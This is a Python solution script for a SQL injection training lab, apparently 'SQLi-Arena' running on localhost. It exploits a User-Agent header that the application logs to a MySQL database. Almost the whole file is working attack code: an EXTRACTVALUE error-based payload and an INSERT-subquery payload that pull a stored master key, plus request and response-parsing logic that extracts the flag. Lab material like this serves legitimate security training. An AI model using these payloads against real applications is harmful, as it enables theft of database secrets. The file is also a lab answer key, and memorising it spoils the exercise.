#!/usr/bin/env python3
"""
Lab 16 -- Header Injection: User-Agent
======================================
Extracts the system key via EXTRACTVALUE error-based injection
in the HTTP User-Agent header, which is logged to the database.

Usage:
    python3 lab16_header_useragent.py [BASE_URL]

Default target: http://localhost/SQLi-Arena
"""
import requests
import sys
import re

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost/SQLi-Arena"
TARGET = f"{BASE}/mysql/lab16"


def extract_via_extractvalue():
    """Use EXTRACTVALUE XPATH error to leak the system key."""
    payload = (
        "test' AND EXTRACTVALUE(1, CONCAT(0x7e, "
        "(SELECT key_value FROM system_keys WHERE key_name='master')"
        ")) AND '1'='1"
    )

    print(f"[*] Payload (in User-Agent header):")
    print(f"    {payload}")
    print()

    r = requests.get(TARGET, headers={"User-Agent": payload})

    # Look for XPATH error containing the flag (handle HTML entities)
    import html as html_mod
    text = html_mod.unescape(r.text)
    match = re.search(r"XPATH syntax error: '~([^']+)'", text)
    if match:
        return match.group(1)

    # Also try matching FLAG directly
    match = re.search(r"FLAG\{[^}]+\}", text)
    if match:
        return match.group(0)

    # Check for other MySQL errors
    err_match = re.search(r"MySQL Error:</strong>\s*(.+?)</div>", text)
    if err_match:
        print(f"[-] MySQL Error: {err_match.group(1)}")
    return None


def extract_via_insert_subquery():
    """Alternative: inject subquery into INSERT to store flag in visitors table."""
    payload = (
        "hacked', (SELECT key_value FROM system_keys "
        "WHERE key_name='master')) -- -"
    )

    print(f"[*] Alternative payload (subquery in INSERT):")
    print(f"    {payload}")
    print()

    r = requests.get(TARGET, headers={"User-Agent": payload})

    match = re.search(r"FLAG\{[^}]+\}", r.text)
    if match:
        return match.group(0)
    return None


# ── Main ──
print(f"[*] Target: {TARGET}")
print("[*] Injection point: User-Agent HTTP header")
print()

# Method 1: EXTRACTVALUE error-based
print("=" * 50)
print("[*] Method 1: EXTRACTVALUE error-based extraction")
print("=" * 50)
flag = extract_via_extractvalue()

if flag:
    print(f"\n[+] Flag: {flag}")
else:
    print("\n[-] EXTRACTVALUE method failed, trying alternative...")
    print()
    print("=" * 50)
    print("[*] Method 2: Subquery injection in INSERT")
    print("=" * 50)
    flag = extract_via_insert_subquery()

    if flag:
        print(f"\n[+] Flag: {flag}")
    else:
        print("\n[-] Both methods failed. Check lab setup.")
        sys.exit(1)
